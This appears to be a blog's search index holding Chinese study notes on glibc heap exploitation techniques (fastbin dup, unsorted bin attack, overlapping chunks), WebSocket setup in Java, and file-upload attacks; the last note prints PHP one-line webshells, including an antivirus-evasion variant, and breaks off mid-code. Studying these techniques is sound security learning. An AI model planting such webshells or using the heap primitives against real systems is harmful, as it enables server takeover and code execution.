<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>How2Heap学习</title>
    <link href="/2022/08/02/How2heap/"/>
    <url>/2022/08/02/How2heap/</url>
    
    <content type="html"><![CDATA[<h2 id="GLIBC-特性"><a href="#GLIBC-特性" class="headerlink" title="GLIBC 特性"></a>GLIBC 特性</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p>GLIBC采用first fit算法来分配空间:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">char</span>* a; <span class="hljs-type">char</span>* b; <span class="hljs-type">char</span>* c; <span class="hljs-comment">//创建三个字符指针</span><br>a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>); <span class="hljs-comment">//分配空间</span><br>b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<span class="hljs-comment">//防止与top_chunk合并</span><br>print(<span class="hljs-string">&quot;a: %p \nb: %p \n&quot;</span>,a,b);<span class="hljs-comment">//0x55e59a3ed2a0 0x55e59a3ed7c0</span><br><br><span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;Test A&quot;</span>);<span class="hljs-comment">//设置a指向的空间中的字符串为&quot;Test A&quot;</span><br><span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//释放a指向的空间</span><br><br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<span class="hljs-comment">//分配空间</span><br>print(<span class="hljs-string">&quot;c: %p \n&quot;</span>);<span class="hljs-comment">//0x55e59a3ed2a0</span><br><span class="hljs-comment">//此处可以发现此时c指向的地址与原本a指向的地址相同</span><br><span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;Test C&quot;</span>);<br>print(<span class="hljs-string">&quot;a: %s  c: %s\n&quot;</span>);<span class="hljs-comment">//a: Test C  c: Test C</span><br></code></pre></td></tr></table></figure><h3 id="Chunk结构"><a href="#Chunk结构" class="headerlink" title="Chunk结构"></a>Chunk结构</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">   0 1 2 3 4 5 6 7 8 9 A B C D E F<br>0 |<span class="hljs-string">   prev_size   </span>|<span class="hljs-string">   size  </span>|<span class="hljs-string">A</span>|<span class="hljs-string">M</span>|<span class="hljs-string">P</span>|<br>1 |<span class="hljs-string">      fd       </span>|<span class="hljs-string">       bk      </span>|<br>2 |<span class="hljs-string">              data             </span>|<br>…|<span class="hljs-string">               …</span>|<br>n |<span class="hljs-string">   data      </span>|<br></code></pre></td></tr></table></figure><p>其中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C">prev_size: 如果该Chunk<span class="hljs-string">&quot;物理相邻&quot;</span>的前一Chunk未分配,则prev_size等于前一个chunk的size<br> 否则该字段用于储存前一个Chunk的数据<br><span class="hljs-comment">//前一Chunk指地址较低的Chunk</span><br>size: size为Chunk的大小,必须为 <span class="hljs-number">2</span>*SIZE_SZ 的整数倍<br>      申请Chunk时如果申请的空间大小不是 <span class="hljs-number">2</span>*SIZE_SZ 的整数倍会向上取 <span class="hljs-number">2</span>*SIZE_SZ的整数倍<br>    <span class="hljs-comment">// 在32 位系统中，SIZE_SZ 是 4 在64 位系统中，SIZE_SZ 是 8</span><br>A: NON_MAIN_ARENA 当前chunk是否属于主线程,<span class="hljs-number">1</span>不属于,<span class="hljs-number">0</span>属于<br>M: IS_MAPPED 当前chunk是否由MMAP分配<br>P: PREV_INUSE 前一个chunk是否被分配<br>   当chunk的P位为<span class="hljs-number">0</span>时,可以通过prev_size获取前一个chunk的大小和地址<br>fd: 当chunk未分配时,fd为<span class="hljs-string">&quot;当前chunk所处的空闲chunk管理链表&quot;</span>的下一个空闲chunk<br>    当chunk已分配时,fd作为data的一部分<br>bk: 当chunk未分配时,bk为<span class="hljs-string">&quot;当前chunk所处的空闲chunk管理链表&quot;</span>的上一个空闲chunk<br>    当chunk已分配时,bk作为data的一部分<br>data: 用于储存数据的部分 data+fd+bk的长度(所占字节数)等于size的值<br></code></pre></td></tr></table></figure><h2 id="GLIBC-2-23"><a href="#GLIBC-2-23" class="headerlink" title="GLIBC 2.23"></a>GLIBC 2.23</h2><p>Fastbin dup:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<span class="hljs-comment">//分配空间0x559d609b3010</span><br>b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<span class="hljs-comment">//分配空间  0x559d609b3030</span><br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<span class="hljs-comment">//防止与top_chunk合并</span><br><span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//fastbin(0x10) =&gt; a</span><br><span class="hljs-built_in">free</span>(b);<span class="hljs-comment">//fastbin(0x10) =&gt; b-&gt;a</span><br><span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//fastbin(0x10) =&gt; a-&gt;b-&gt;a</span><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<span class="hljs-comment">//0x559d609b3010</span><br>e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<span class="hljs-comment">//0x559d609b3030</span><br>f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<span class="hljs-comment">//0x559d609b3010</span><br></code></pre></td></tr></table></figure><p>Fastbin dup into stack:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var = <span class="hljs-number">0x20</span> <span class="hljs-comment">//0x7ffc8bd143b0</span><br>a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>) <span class="hljs-comment">//0x560c0778c010 0x560c0778c030 防止与top_chunk合并</span><br><span class="hljs-built_in">free</span>(a);<span class="hljs-built_in">free</span>(b);<span class="hljs-built_in">free</span>(a) <span class="hljs-comment">//fastbin(0x10) =&gt; a-&gt;b-&gt;a</span><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>) <span class="hljs-comment">//0x560c0778c010 0x560c0778c030</span><br>*d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d)) <span class="hljs-comment">//fd = &amp;stack_var - 8 = 0x7ffc8bd143a8</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>) <span class="hljs-comment">// 0x560c0778c010</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>) <span class="hljs-comment">/* 0x7ffc8bd143b0 */</span> == ((<span class="hljs-type">char</span>*)&amp;stack_var) + <span class="hljs-number">8</span> <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>Fastbin dup consolidate:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<span class="hljs-comment">//分配空间 0x55d37dd16420</span><br>b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<span class="hljs-comment">//防止与top_chunk合并</span><br><span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//释放a</span><br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-comment">//申请large bin的时候已经执行了malloc_consolidate</span><br><span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//并不会报错,这个时候a已经被放到了unsorted bin之中</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<span class="hljs-comment">//0x55d37dd16420</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<span class="hljs-comment">//0x55d37dd16420</span><br></code></pre></td></tr></table></figure><p>Overlapping chunks:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">//分配空间</span><br>p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">//</span><br>p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">//防止与top_chunk合并</span><br><br><span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x30</span>);  <span class="hljs-comment">//设置空间内容</span><br><span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x30</span>);<br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x30</span>);<br><br>*(p2 - <span class="hljs-number">8</span>) = <span class="hljs-number">0x81</span>; <span class="hljs-comment">//修改p2的chunk size 为p2+p3,注意PREV_INUSE位</span><br>*(p3 - <span class="hljs-number">8</span>) = <span class="hljs-number">0x0</span>; <span class="hljs-comment">//修改p3的chunk size 为 0</span><br><br><span class="hljs-built_in">free</span>(p2)<span class="hljs-comment">//释放p2</span><br>  <br>p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x70</span>);<span class="hljs-comment">//申请一个与p2等大的空间</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2: %p\np4: %p&quot;</span>,p2,p4);<br><br></code></pre></td></tr></table></figure><p>Unsorted bin attack:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> var = <span class="hljs-number">0</span>;<span class="hljs-comment">//0x7ffd84399820</span><br>p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<span class="hljs-comment">//分配空间0x55afef224010</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<span class="hljs-comment">//防止与top_chunk合并</span><br><br><span class="hljs-built_in">free</span>(p);<span class="hljs-comment">//释放p</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p&quot;</span>,p, p+<span class="hljs-number">8</span>);<span class="hljs-comment">//置入unsorted_bin的块的fd和bk会指向一个main_arena附近的地址 可泄露libc</span><br>*(p + <span class="hljs-number">1</span>) = (&amp;var - <span class="hljs-number">2</span>)<span class="hljs-comment">//将p的bk设为var上方的地址</span><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<span class="hljs-comment">//malloc一个与p等大的空间</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,var); <span class="hljs-comment">//此时var会被修改为一个很大的值 1693350776</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,var); <span class="hljs-comment">//0x7f2d64ee7b78</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;TODO</p><p>Poison null byte:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WebSocket学习笔记</title>
    <link href="/2022/07/13/WebSocket%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/07/13/WebSocket%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>创建WebSocket对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> webSocket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(url,[protocal]);<br></code></pre></td></tr></table></figure><p>WebSocket事件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Java">webSocket.onopen = xx;     <span class="hljs-comment">//建立连接时调用</span><br>webSocket.onmessage = xx;  <span class="hljs-comment">//收到消息时调用</span><br>webSocket.onerror = xx; <span class="hljs-comment">//发生错误时调用</span><br>webSocket.onclose = xx;    <span class="hljs-comment">//连接关闭时调用</span><br></code></pre></td></tr></table></figure><p>WebSocket属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">webSocket.<span class="hljs-property">readyState</span>; <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">表示连接状态:</span><br><span class="hljs-comment">0 - 连接尚未建立</span><br><span class="hljs-comment">1 - 连接已建立</span><br><span class="hljs-comment">2 - 连接正在关闭</span><br><span class="hljs-comment">3 - 连接已经关闭或无法打开</span><br><span class="hljs-comment">*/</span><br>webSocket.<span class="hljs-property">bufferedAmount</span><br><span class="hljs-comment">//表示在缓冲区内的字节数</span><br></code></pre></td></tr></table></figure><p>WebSocket方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Javascript">webSocket.<span class="hljs-title function_">send</span>()<span class="hljs-comment">//发送数据</span><br>webSocket.<span class="hljs-title function_">close</span>() <span class="hljs-comment">//关闭连接</span><br></code></pre></td></tr></table></figure><h2 id="Severlet原生WebSocket"><a href="#Severlet原生WebSocket" class="headerlink" title="Severlet原生WebSocket"></a>Severlet原生WebSocket</h2><p>WebSocket配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebsocketConfiguration</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServerEndpointExporter <span class="hljs-title function_">serverEndpointExporter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerEndpointExporter</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>WebSocket处理器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@ServerEndpoint(&quot;/test&quot;)</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyWebsocketServer</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 存放所有在线的客户端</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, Session&gt; clients = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br><br>    <span class="hljs-meta">@OnOpen</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onOpen</span><span class="hljs-params">(Session session)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;有新的客户端连接了: &#123;&#125;&quot;</span>, session.getId());<br>        <span class="hljs-comment">//将新用户存入在线的组</span><br>        clients.put(session.getId(), session);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 客户端关闭</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> session session</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@OnClose</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClose</span><span class="hljs-params">(Session session)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;有用户断开了, id为:&#123;&#125;&quot;</span>, session.getId());<br>        <span class="hljs-comment">//将掉线的用户移除在线的组里</span><br>        clients.remove(session.getId());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 发生错误</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> throwable e</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@OnError</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> &#123;<br>        throwable.printStackTrace();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 收到客户端发来消息</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> message  消息对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@OnMessage</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMessage</span><span class="hljs-params">(String message)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;服务端收到客户端发来的消息: &#123;&#125;&quot;</span>, message);<br>        <span class="hljs-built_in">this</span>.sendAll(message);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="websocket-spring-boot-starter"><a href="#websocket-spring-boot-starter" class="headerlink" title="websocket-spring-boot-starter"></a>websocket-spring-boot-starter</h2><p>配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@EnableWebSocket</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebSocketConfigurer</span> &#123;<br>    <span class="hljs-meta">@Resource</span><br>    WebSocketHandler defaultHandler;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerWebSocketHandlers</span><span class="hljs-params">(WebSocketHandlerRegistry registry)</span> &#123;<br>        registry.addHandler(defaultHandler, <span class="hljs-string">&quot;/ws&quot;</span>).addInterceptors().setAllowedOrigins(<span class="hljs-string">&quot;*&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Handler</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebSocketHandler</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 建立连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterConnectionEstablished</span><span class="hljs-params">(WebSocketSession session)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 缓存用户信息: userInfo</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 接收消息</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> session</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(WebSocketSession session, WebSocketMessage&lt;?&gt; message)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 发生错误</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTransportError</span><span class="hljs-params">(WebSocketSession session, Throwable exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 清除用户缓存信息</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 关闭连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterConnectionClosed</span><span class="hljs-params">(WebSocketSession session, CloseStatus closeStatus)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 清除用户缓存信息</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsPartialMessages</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Interceptor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandshakeInterceptor</span> &#123;<br>  <span class="hljs-comment">//握手前拦截,返回true放行,返回false阻断</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">beforeHandshake</span><span class="hljs-params">(ServerHttpRequest request, ServerHttpResponse response, WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>  <span class="hljs-comment">//握手后执行</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHandshake</span><span class="hljs-params">(ServerHttpRequest request, ServerHttpResponse response, WebSocketHandler wsHandler, Exception exception)</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传学习笔记</title>
    <link href="/2022/07/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2022/07/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP的工作流程"><a href="#PHP的工作流程" class="headerlink" title="PHP的工作流程"></a>PHP的工作流程</h2><ol><li>当用户访问PHP文件时会发送一个HTTP请求,并将请求传送到WEB服务器.</li><li>WEB服务器接受请求,根据后缀判断是PHP请求,随后WEB服务器调出用户访问的PHP文件发送给PHP引擎程序.</li><li>PHP引擎程序对WEB服务发送过来的文件从头到尾进行扫描并根据PHP代码从后台读取、处理数据并动态地生成相应的HTML页面.</li><li>PHP引擎将生成HTML页面返回给WEB服务器。WEB服务器再将HTML页面返回给客户端浏览器.</li></ol><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>一句话木马本质是一个PHP文件,其文件内容中含有可执行远程端发送的字符串的PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>控制者可以通过HTTP POST请求发送恶意的字符串,服务端接收到这个字符串以后会将它当作PHP代码执行</p><p>有时为了避免一句话木马被杀毒软件干掉,会改变写法,但最终的目的都是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;eval&#x27;</span><br>@<span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span 